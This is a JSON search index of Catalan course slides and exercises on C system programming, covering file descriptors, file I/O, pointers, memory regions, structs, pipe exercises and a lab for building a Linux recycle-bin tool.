    "text": "Descriptors de fitxers (II)\n printf(\"\\nOpening /dev/zero a second time...\\n\");\n if ((fd2 = open(\"/dev/zero\", O_RDONLY)) &lt; 0) {\n  fprintf(stderr, \"Unable to open /dev/zero: %s\\n\", strerror(errno));\n  exit(EXIT_FAILURE);\n }\n printf(\"fd2: %d\\n\", fd2);\n\n printf(\"\\nNow closing fd1, but keeping fd2 open..\\n\");\n (void)close(fd1);\n\n printf(\"\\nOpening /dev/zero a third time...\\n\");\n if ((fd3 = open(\"/dev/zero\", O_RDONLY)) &lt; 0) {\n  fprintf(stderr, \"Unable to open /dev/zero: %s\\n\", strerror(errno));\n  exit(EXIT_FAILURE);\n }\n printf(\"fd3: %d\\n\", fd3);",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#descriptors-de-fitxers-iii",
    "href": "slides/01-c.html#descriptors-de-fitxers-iii",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Descriptors de fitxers (III)",
    "text": "Descriptors de fitxers (III)\n printf(\"\\nNow closing fd2 and fd3.\\n\");\n (void)close(fd2);\n (void)close(fd3);\n\n printf(\"Now opening /dev/zero as a stream.\\n\");\n if ((f = fopen(\"/dev/zero\", \"r\")) == NULL) {\n  fprintf(stderr, \"Unable to open /dev/zero: %s\\n\", strerror(errno));\n  exit(EXIT_FAILURE);\n }\n printf(\"f: %d\\n\", fileno(f));\n (void)fclose(f);\n\n return EXIT_SUCCESS;\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#llegint-fitxers-i",
    "href": "slides/01-c.html#llegint-fitxers-i",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Llegint fitxers (I)",
    "text": "Llegint fitxers (I)\n\n\n#include &lt;unistd.h&gt; \nssize_t read\n(int fd, \n void *buf, size_t);\n\nssize_t write\n(int fd, \n void *buf, size_t);\n\nread(): Intenta llegir/escriure fins a nbytes bytes del fitxer especificat per fd i emmagatzemar-los a l’àrea de memòria que comença a buf. Paràmetres:\n\nfd: descriptor del fitxer que es llegirà/escriurà.\nnbytes: nombre de bytes a llegir/escriure.\nbuf : apunta a la memòria intermèdia on es desarà la informació de lectura/escriptura. Retorna:\n\nSi té èxit, retorna el nombre de bytes de lectura/escriptura (0 significa final del fitxer).\nSi hi ha error, retorna -1 i especifica el motiu en errno.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#llegint-fitxer-ii",
    "href": "slides/01-c.html#llegint-fitxer-ii",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Llegint fitxer (II)",
    "text": "Llegint fitxer (II)\nint main(int argc, char* argv[]) {\n  char string[11]; int b_read;\n  int file = open (\"my_file\", O_RDONLY); \n  if(file == -1) { \n    perror(\"Error while opening file\");\n    exit(1);\n  }\n  b_read = read(file, string, 10);\n  close(file);\n  string[10] = 0;\n  printf(\"%d B have been read. The obtained string is: %s\\n\", \n    b_read, string);\n  return 0;\n}\n\nFitxer: sources/llegir_fitxer.c\n\n\nPer generar un fitxer amb dades aleatòries: head -c 1024 &lt;/dev/urandom &gt; my_file.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#escrivint-fitxers",
    "href": "slides/01-c.html#escrivint-fitxers",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Escrivint fitxers",
    "text": "Escrivint fitxers\nint main(int argc, char* argv[]) {\n\n  const char* string = \"\\nWinter is coming\\n\\n\";\n\n  int file = open(\"new_file\", O_CREAT|O_WRONLY, 0644);\n\n  if(file == -1) { \n    perror(\"Error when opening file\");\n    exit(1);\n  }\n\n  write(file, string, strlen(string));\n  close(file);\n\n  exit(0);\n}\n\nFitxer: sources/escriure_fitxer.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#llegintescrivint-en-llocs-específics",
    "href": "slides/01-c.html#llegintescrivint-en-llocs-específics",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Llegint/Escrivint en llocs específics",
    "text": "Llegint/Escrivint en llocs específics\n\n\n#include &lt; sys/types.h&gt; \n#include &lt; unistd.h&gt; \noff_t lseek( int fd,\n off_t offset, \n int whence)\n\n\nfd: descriptor de fitxer.\noffset: desplaçament relatiu del punter en bytes.\nwhence: directiva de desplaçament:\n\nSEEK_SET: el punter es col·loca offset bytes.\nSEEK_CUR: el punter es mou offset bytes des de la seva posició actual.\nSEEK_END: el punter es mou offset bytes des del final del fitxer.\n\nSi té èxit, retorna la posició absoluta del punter (en bytes).\nSi hi ha error, retorna -1 i especifica el motiu en errno.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#llegint-fitxers-en-llocs-específics",
    "href": "slides/01-c.html#llegint-fitxers-en-llocs-específics",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Llegint fitxers en llocs específics",
    "text": "Llegint fitxers en llocs específics\nint main(int argc, char* argv[]) {\n  char string[11];\n  int b_read;\n\n  int file = open (\"my_file\", O_RDONLY); \n\n  lseek(file, 46, SEEK_SET);\n  b_read = read(file, string, 10); // Read 10 bytes\n  close(file);\n\n  string[10] = 0;\n  printf(\"%d B have been read. The obtained string is: %s\\n\", \n  b_read, string);\n\n  return 0;\n}\n\nFitxer: sources/llegir_fitxer2.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#escrivint-en-llocs-específics",
    "href": "slides/01-c.html#escrivint-en-llocs-específics",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Escrivint en llocs específics",
    "text": "Escrivint en llocs específics\nchar buf1[] = \"abcdefghij\";\nchar buf2[] = \"ABCDEFGHIJ\";\n\nint main() {\n  int fd;\n  if((fd = creat(\"new_file2\", 0644)) &lt; 0) {\n    perror(\"new_file2\"); exit(-1);\n  }\n\n  if(write(fd, buf1, 10) != 10)       perror(\"buf1\");    // offset == 10\n  if(lseek(fd, 4, SEEK_SET) == -1)    perror(\"lseek\");   // offset == 4\n  if(write(fd, buf2, 10) != 10)       perror(\"buf2\");    // offset == 14\n\n  return 0;\n}\n\nFitxer: sources/escriure_fitxer2.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#què-són-els-punters",
    "href": "slides/01-c.html#què-són-els-punters",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Què són els punters?",
    "text": "Què són els punters?\n\n\nConcepte\n\nTotes les dades (variables, constants,…) s’emmagatzemen des d’una determinada adreça de memòria i utilitzant tants bytes com sigui necessari.\nUn punter és una variable guardada en una adreça de mèmoria que conté un altra adreça de memòria.\n\n\nOperadors\n\n&: Retorna l’adreça de l’apuntador. Per exemple &x ens dóna l’adreça de la variable x.\n* Retorn el valor de la variable situada a l’adreça especificada pel seu operand (dereferencing).\n\n\n\nEl valor que retorna l’operador & depèn de la posició del seu operand i, per tant, no està sota el control del programador.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#com-funcionen-els-punters-i",
    "href": "slides/01-c.html#com-funcionen-els-punters-i",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Com funcionen els punters? (I)",
    "text": "Com funcionen els punters? (I)\nint main (int argc, char * argv[]){\nint s=10,n,m;\nint *ptr=&s;\n};",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#com-funcionen-els-punters-ii",
    "href": "slides/01-c.html#com-funcionen-els-punters-ii",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Com funcionen els punters? (II)",
    "text": "Com funcionen els punters? (II)\n\n\nint \nmain (int argc, \n    char * argv[]){\n    int s=10;\n    float f=10.5;\n    char a='a';\n\n    int *pt1 = &s;\n    float *pt2 = &f;\n    char *pt3= &a;\n};\n\n\n\n\nFitxer: sources/punters_diapos.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#operacions-amb-punters-i",
    "href": "slides/01-c.html#operacions-amb-punters-i",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Operacions amb punters (I)",
    "text": "Operacions amb punters (I)\n\nAssignació (=): Assigna una adreça a un punter.\nComparació (==, !=): Igualtat o desigualtat.\nInicialització (NULL): Indica que el punter no conté cap adreça.\nIncrement (++), decrement (–): Canviar un punter a l’element següent/anterior d’una sèrie (per exemple, una matriu).\nIndexat ([]): accés a l’element n d’una sèrie.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#operacions-amb-punters-ii",
    "href": "slides/01-c.html#operacions-amb-punters-ii",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Operacions amb punters (II)",
    "text": "Operacions amb punters (II)\nint n = 2;\nint *ptr1 = NULL;\nptr1 = &n;\n(*ptr1)++        //Modifiquem el valor de la variable a la que apunta\nptr1++           //Modifiquem l'adreça de memòria on apunta",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#pas-de-paràmetres-valor",
    "href": "slides/01-c.html#pas-de-paràmetres-valor",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Pas de paràmetres (valor)",
    "text": "Pas de paràmetres (valor)\n#include &lt;stdio.h&gt;\n\nint sumar_per_valor(int a, int b) {\n    a = a + b;\n    return a;\n}\n\nint main() {\n    int x = 5;int y = 3;\n    printf(\"Abans de la crida per valor: x = %d, y = %d\\n\", x, y);\n    int resultat = sumar_per_valor(x, y);\n    printf(\"Després de la crida per valor: x = %d, y = %d\\n\", x, y);\n    printf(\"Resultat de la suma: %d\\n\", resultat);\n\n    return 0;\n}\n\nFitxer: sources/pas_valor.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#pas-de-paràmetres-referència",
    "href": "slides/01-c.html#pas-de-paràmetres-referència",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Pas de paràmetres (referència)",
    "text": "Pas de paràmetres (referència)\n#include &lt;stdio.h&gt;\n\nvoid sumar_per_referencia(int *a, int *b) {\n    *a = *a + *b;\n}\n\nint main() {\n    int x = 5; int y = 3;\n    printf(\"Abans de la crida per referència: x = %d, y = %d\\n\", x, y);\n    sumar_per_referencia(&x, &y);\n    printf(\"Després de la crida per referència: x = %d, y = %d\\n\", x, y);\n    return 0;\n}\n\nFitxer: sources/pas_referencia.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#exemple-ordenació-dun-array",
    "href": "slides/01-c.html#exemple-ordenació-dun-array",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Exemple: Ordenació d’un array",
    "text": "Exemple: Ordenació d’un array\nvoid ordenar(int n, int* ptr)\n{\n    int i, j, t;\n    for (i = 0; i &lt; n; i++) {\n        for (j = i + 1; j &lt; n; j++) {\n            if (*(ptr + j) &lt; *(ptr + i)) {\n                t = *(ptr + i);\n                *(ptr + i) = *(ptr + j);\n                *(ptr + j) = t;\n            }\n        }\n    }\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#què-és-la-stack",
    "href": "slides/01-c.html#què-és-la-stack",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Què és la Stack?",
    "text": "Què és la Stack?\nÉs una estructura LIFO (Last-In,First-Out). La pila és una regió especial de memòria i la gestiona automàticament la CPU, de manera que no cal assignar ni desassignar memòria. La memòria de pila es divideix en trames successives on cada vegada que es crida una funció, s’assigna una nova trama de pila.\nCaracterístiques de la Stack\n\nOrdre seqüencial: Les variables s’empilen i desempilen en ordre seqüencial.\nGestió automàtica: No cal que el programador assigni o alliberi memòria manualment.\nLimitació de mida: La pila és limitada, i si es supera el seu límit, es produeix un desbordament de pila.\nVariables locals: Les variables de la pila només existeixen mentre la funció està en execució.\nEficient: L’accés a la memòria de la pila és molt ràpid, ja que segueix un ordre seqüencial i clar.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#què-és-la-heap",
    "href": "slides/01-c.html#què-és-la-heap",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Què és la Heap?",
    "text": "Què és la Heap?\nLa heap és una àrea de memòria on s’assigna memòria de manera dinàmica durant el temps d’execució. Aquesta memòria es gestiona a través de funcions específiques com malloc(), calloc() i free(), i és responsabilitat del programador garantir que la memòria s’alliberi quan ja no sigui necessària.\nCaracterístiques de la Heap\n\nGestió manual: El programador ha de controlar l’assignació i alliberament de la memòria.\nFlexibilitat: És útil per a grans blocs de memòria o per a objectes que han de romandre en memòria més temps que una funció específica.\nLimitació per memòria física: La mida de la heap està limitada per la quantitat de memòria física disponible al sistema.\nCost d’execució: Les operacions amb la heap són més lentes comparades amb la pila, a causa de la gestió dinàmica i la fragmentació.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#exemple-heap-vs-stack",
    "href": "slides/01-c.html#exemple-heap-vs-stack",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Exemple: Heap vs Stack",
    "text": "Exemple: Heap vs Stack\n\n\nint main() {     \n    int y;   \n    char *str; \n    y = 4;\n    printf(\"stack memory: %d\\n\", y);\n    str = malloc(100*sizeof(char)); \n    str[0] = 'm';\n    printf(\"heap memory:%c\\n\", str[0]); \n    free(str);         \n    return 0;\n}\n\n\n\n\nFitxer: sources/zones_mem.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#stackoverflow",
    "href": "slides/01-c.html#stackoverflow",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "StackOverflow",
    "text": "StackOverflow\n\n\nExemple\nvoid func() {\n    int vector[1000];\n    func();\n}\n\nint main() {\n    func();\n    return 0;\n}\n\nQuè és un StackOverflow?\nUn stack overflow es produeix quan la pila del programa supera la seva capacitat màxima. Això pot passar quan es criden funcions recursives de manera infinita o quan s’assignen grans quantitats de memòria a la pila.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#exemple-ordenar-amb-memòria-dinàmica-i",
    "href": "slides/01-c.html#exemple-ordenar-amb-memòria-dinàmica-i",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Exemple: Ordenar amb memòria dinàmica (I)",
    "text": "Exemple: Ordenar amb memòria dinàmica (I)\nint main() {\n    int* nums = NULL;  \n    int n = 0, max_elements = 10, num;\n\n    nums = (int*)malloc(max_elements * sizeof(int));\n    if (nums == NULL) {\n        printf(\"Error en l'assignació de memòria.\\n\");\n        return 1;\n    }\n\n    capta_dades(n, nums);\n    ordenar(n, nums);\n    free(nums);\n    return 0;\n}\n\nFitxer: sources/pas_referencia.c",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#exemple-ordenar-amb-memòria-dinàmica-ii",
    "href": "slides/01-c.html#exemple-ordenar-amb-memòria-dinàmica-ii",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Exemple: Ordenar amb memòria dinàmica (II)",
    "text": "Exemple: Ordenar amb memòria dinàmica (II)\n\ncapta_dades(int n, int* nums) {\n  while (scanf(\"%d\", &num) != EOF) {\n    if (n &gt;= max_elements) {\n      max_elements *= 2;\n      int* temp = (int*)realloc(nums, max_elements * sizeof(int));\n      if (temp == NULL) {\n        printf(\"Error en l'assignació de memòria.\\n\");\n        free(nums);\n        return 1;\n      }\n      nums = temp;\n    }\n  nums[n] = num;\n  n++;\n  }\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#qué-són-els-structs",
    "href": "slides/01-c.html#qué-són-els-structs",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Qué són els structs?",
    "text": "Qué són els structs?\nUna estructura és un tipus de dades derivats format per membres que són tipus de dades fonamentals o derivats. Una única estructura emmagatzemaria les dades d’un objecte. Una matriu d’estructures emmagatzemaria les dades de diversos objectes.\n\n\nSenser reserva espai de Memòria\nstruct user {\nint pid;\nchar * name;\n}\n\nReservant espai de Memòria\nstruct user {\nint pid;\nchar * name;\n} user;",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#qué-són-els-typedef",
    "href": "slides/01-c.html#qué-són-els-typedef",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Qué són els Typedef?",
    "text": "Qué són els Typedef?\nTypedef s’utilitza per crear sinònims per a noms de tipus de dades definits prèviament.\n\n\ntypedef int L;\nint a;\nL a;\n\ntypedef struct {\nint pid;\nchar * name;\n} User; \n\n\n\n\nUser user;\nuser.name=\"\nJordi Mateo\";\nuser.pid=5000;\n\nUser * user1;\nuser1-&gt;name=\"Jack \nsparrow\";\n*(user1).pid=5001;\nUser *user2 = &user;",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#calculant-la-distancia-entre-2-punts",
    "href": "slides/01-c.html#calculant-la-distancia-entre-2-punts",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Calculant la distancia entre 2 punts",
    "text": "Calculant la distancia entre 2 punts\ntypedef struct {\n  float x; float y;\n} point ;\n \nfloat dist( point A, point B) {\n  return(sqrt((A.x - B.x)*(A.x - B.x) + (A.y - B.y)*(A.y - B.y)));\n}\n \nint main(){\n  float d; point A, B;\n  printf(\"The coordinates of the point A are: \");\n  scanf(\"%f %f\",&A.x,&A.y);\n  printf(\"\\nThe coordinates of the point B are: \");\n  scanf(\"%f %f\",&B.x,&B.y);\n  printf(\"\\nThe distance between A and B is %f\\n\", dist(A,B));\n  exit (0);\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#exercicis",
    "href": "slides/01-c.html#exercicis",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Exercicis",
    "text": "Exercicis\n\nDebianBin",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "slides/01-c.html#això-és-tot-per-avui",
    "href": "slides/01-c.html#això-és-tot-per-avui",
    "title": "Introducció a la programació de Sistema (I) (C)",
    "section": "Això és tot per avui",
    "text": "Això és tot per avui\n\n\nPreguntes?\nTot el codi i exemples addicionals els trobareu a la carpeta 01-sources del repositori GitHub del curs.\n\nTAKE HOME MESSAGE\nEl kernel de Linux s’ha escrit en C, per tant, és important conèixer aquest llenguatge de programació si volem entendre com funciona el sistema operatiu.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 · Introducció a la programació de Sistema (I) (C)"
    ]
  },
  {
    "objectID": "activities/unit02/02-pipes.html",
    "href": "activities/unit02/02-pipes.html",
    "title": "Exercicis de Pipes en C",
    "section": "",
    "text": "Volem implementar un programa en C que permeti generar bitllets de loteria de forma concurrent de la mateixa manera que als apunts generador_loteria, però aquesta vegada els processos fills han de comunicar els números generats al procés pare mitjançant una pipe en lloc de retornar-los com a codi de sortida.\nAnalitza el programa següent i indica la evolució de la taula de descriptors oberts de cada fitxer. Explica què fa el programa.\n#include &lt;unistd.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;fcntl.h&gt;\n\nint main(){\n    int fd;\n    int pipefd[2];\n    char msg[200];\n    char buffer[200];\n\n    fd = open(\"fitxer.txt\", O_RDONLY);\n    pipe(pipefd);\n\n    if(fork() == 0){\n        close(1);\n        close(pipefd[0]);\n        write(4, \"Hola\", 4);\n        while(1);\n        exit(0);\n    }\n\n    else{\n        close(pipefd[1]);\n        read(pipefd[0], buffer, 4);\n        sprintf(msg, \"PARE -&gt; %s\\n\", buffer);\n        write(1, msg, strlen(msg));\n        wait(NULL);\n        exit(0);\n    }\n}\nImplementa amb C la comanda següent: cat &lt; /etc/passwd | grep root utilitzant 2 fills i un pare. Per recobrir heu de fer servir obligatòriament les crides:\n\nexeclp(\"grep\", \"grep\", \"root\", NULL)\nexeclp(\"cat\", \"cat\", NULL)\n\nEn el programa anterior el filtre és estàtic root, com podriam modificar el codi anterior per tenir un filtre dinàmic passat com a argument a l’execució del programa? Per exemple: ./prog root.\nImplementa amb C el següent programa: head -10 &lt; infile | sort -n | tail -3 &gt; outfile.\nImplementa la multiplicació de matrius utilitzant processos i pipes. El procés pare ha de llegir dues matrius quadrades d’un fitxer d’entrada i crear un procés fill per a cada fila de la matriu resultat. Cada procés fill ha de calcular la fila corresponent de la matriu resultat i enviar-la al procés pare mitjançant una pipe. El procés pare ha de recollir totes les files i escriure la matriu resultat en un fitxer de sortida.\nModifica l’exercici anterior per utilitzar pipes anònimes i nominals. Compara els dos mètodes en termes de complexitat i eficiència.",
    "crumbs": [
      "Activitats",
      "Unitat 03",
      "Exercici · Pipes i redireccions"
    ]
  },
  {
    "objectID": "activities/unit00/03-ex02-c.html",
    "href": "activities/unit00/03-ex02-c.html",
    "title": "Exercicis amb C - Apuntadors i structs",
    "section": "",
    "text": "Quin serà el resultat d’aquesta execució?\n#include&lt;stdio.h&gt;\nint main(){\n\n    int x = 5;\n    int *p;\n    p=&x;\n    x++;\n    printf(\"%d\\n\", *p);\n}\nCompleta el codi següent:\n#include &lt;stdio.h&gt;\nint main(){\n    const char *s = \"\";\n    char str[] = \"Hola\";\n    s = str;\n    while(*s)\n        printf(\"%c\", ???);\n    return 0;\n}\nAnalitzeu el següent codi i mostreu el contingut de la memòria durant l’execució del programa.\nint main(){\n\n    struct pokemon {\n        int id;\n        char* name;\n    };\n\n    struct pokemon p1 = {1, \"Bulbasaur\"};\n\n    printf(\"Id: %d\\n\", p1.id);\n    printf(\"Name: %s\\n\", p1.name);\n\n}\nAnalitza el codi següent i digues quin és el resultat de la seva execució.\nint main(){\n    char * s = \"Hola\";\n    char * t = \"Adéu\";\n    char * u;\n\n    s = t;\n    u = strdup(s);\n\n    // Nota: strdup retorna un punter a una nova cadena de caràcters que és una còpia exacta de la cadena de caràcters passada com a argument.\n\n    printf(\"s: %s\\n\", s);\n    printf(\"t: %s\\n\", t);\n    printf(\"u: %s\\n\", u);\n}\nAnalitza el codi següent i digues quin és el resultat de la seva execució.\nint main(){\n\n    int n = 3;\n    char* noms[n];\n    char* nom = (char*)malloc(20*sizeof(char));\n\n    for(int i = 0; i &lt; n; i++){\n        printf(\"Introdueix el teu nom: \");\n        scanf(\"%s\", nom);\n        noms[i] = nom;\n    }\n\n    printf(\"Noms introduïts:\\n\");\n    for(int i = 0; i &lt; n; i++){\n        printf(\"%s\\n\", noms[i]);\n    }\n\n    return 0;\n}\nAnalitza el codi següent i digues quin és el resultat de la seva execució.\n#include &lt;stdio.h&gt;\nint main()\n{\n    int k = 5;\n    int *p = &k;  \n    int **m = &p;\n    **m = 6;  \n    printf(\"%d\\n\", k);\n}\nCompleta el codi següent:\n#include &lt;stdio.h&gt;\nint main() {\n    int arr[4] = {1, 2, 3, 4};  \n\n    // ????\n\n    printf(\"Elements of the array using the pointer:\\n\");\n    for (int i = 0; i &lt; 4; i++) {\n        printf(\"ptr[%d] = %d\\n\", i, (*ptr)[i]);\n    }\n\n    return 0;\n}\nQuin serà el resultat d’aquesta execució?\n#include &lt;stdio.h&gt;\nint main()\n{\n\n    int a[5] = {5,1,15,20,25};\n    int i,j,m;\n    i = ++a[1];\n    j = a[1]++;\n    m = a[i++];\n\n    printf(\"%d, %d, %d\", i, j,m);\n    return 0;\n}\nQuin serà el resultat?\n#include &lt;stdio.h&gt;\n\nvoid foo(int *p)\n{\n    int j = 22;\n    p = &j;\n    printf(\"%d \", *p);\n}\n\nint main()\n{\n    int i = 17, *p = &i;\n    foo(&i);\n    printf(\"%d \", *p);\n}\nQuina serà la sortida?\n#include &lt;stdio.h&gt;\nstruct p\n{\n    int x;\n    int y;\n};\n\n// sizeof(int) == 2 bytes? \n// sizeof(int) == 4 bytes? \n\nint main()\n{\n    struct p p1[] = {\n        {1, 92}, \n        {3, 94}, \n        {5, 96}\n    };\n\n    int x = (sizeof(p1) / 3);\n\n    printf(\"%ld\\n\",sizeof(int));\n\n    if (x == 8)\n        printf(\"true\\n\");\n    else\n        printf(\"false\\n\");\n}\nCompleta el codi següent:\nint main(){\nint (*ptr)();\nreturn 0;\n}",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "Exercicis amb C"
    ]
  },
  {
    "objectID": "activities/unit00/01-debianbin.html",
    "href": "activities/unit00/01-debianbin.html",
    "title": "RMSF · Implementant una paperera de reciclatge a Linux",
    "section": "",
    "text": "Aprendre a utilitzar crides a sistema per obtenir informació de l’usuari, gestionar fitxers i directoris.\nPracticar la manipulació de cadenes en C per construir rutes de fitxers.\nDesenvolupar habilitats en la creació de programes en C que interactuen amb el sistema operatiu.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "RMSF · Implementant una paperera de reciclatge a Linux"
    ]
  },
  {
    "objectID": "activities/unit00/01-debianbin.html#objectius",
    "href": "activities/unit00/01-debianbin.html#objectius",
    "title": "RMSF · Implementant una paperera de reciclatge a Linux",
    "section": "",
    "text": "Aprendre a utilitzar crides a sistema per obtenir informació de l’usuari, gestionar fitxers i directoris.\nPracticar la manipulació de cadenes en C per construir rutes de fitxers.\nDesenvolupar habilitats en la creació de programes en C que interactuen amb el sistema operatiu.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "RMSF · Implementant una paperera de reciclatge a Linux"
    ]
  },
  {
    "objectID": "activities/unit00/01-debianbin.html#introducció",
    "href": "activities/unit00/01-debianbin.html#introducció",
    "title": "RMSF · Implementant una paperera de reciclatge a Linux",
    "section": "Introducció",
    "text": "Introducció\nAls sistemes operatius basats en el nucli de Linux, no hi ha una paperera de reciclatge per defecte. Aquesta funcionalitat, habitual en altres sistemes, no està integrada nativament en l’estructura de fitxers de Linux. L’objectiu d’aquest laboratori és implementar una paperera de reciclatge per a Linux i crear una eina que permeti utilitzar-la (rmsf).\nman rmsf",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "RMSF · Implementant una paperera de reciclatge a Linux"
    ]
  },
  {
    "objectID": "activities/unit00/01-debianbin.html#rmsf1---manual-de-lusuari",
    "href": "activities/unit00/01-debianbin.html#rmsf1---manual-de-lusuari",
    "title": "RMSF · Implementant una paperera de reciclatge a Linux",
    "section": "rmsf(1) - Manual de l’usuari",
    "text": "rmsf(1) - Manual de l’usuari\n\nNOM\nrmsf - Eliminació segura de fitxers i carpetes\n\n\nSÍNTESI\nrmsf file …\n\n\nDESCRIPCIÓ\nL’eina rmsf mou els fitxers i carpetes especificats a la línia de comandes al directori .trash/, situat al directori personal de l’usuari. Aquest procés no suposa l’eliminació definitiva dels fitxers. El programa crea el directori .trash si no existeix. Si els fitxers no tenen permisos d’escriptura i el dispositiu d’entrada estàndard és un terminal, l’usuari rebrà una sol·licitud de confirmació (mostrada a la sortida d’error estàndard).\n\n\nESTAT DE SORTIDA\nrmsf retorna un codi d’èxit 0 en cas d’èxit i &gt;0 si es produeix algun error.\n\n\nEXEMPLES\nEls següents exemples mostren l’ús comú:\n\nrmsf file1\nrmsf file1 dir\nrmsf file1 dir/file2 b\nrmsf file1 dir/subdir/file2",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "RMSF · Implementant una paperera de reciclatge a Linux"
    ]
  },
  {
    "objectID": "activities/unit00/01-debianbin.html#tasques",
    "href": "activities/unit00/01-debianbin.html#tasques",
    "title": "RMSF · Implementant una paperera de reciclatge a Linux",
    "section": "Tasques",
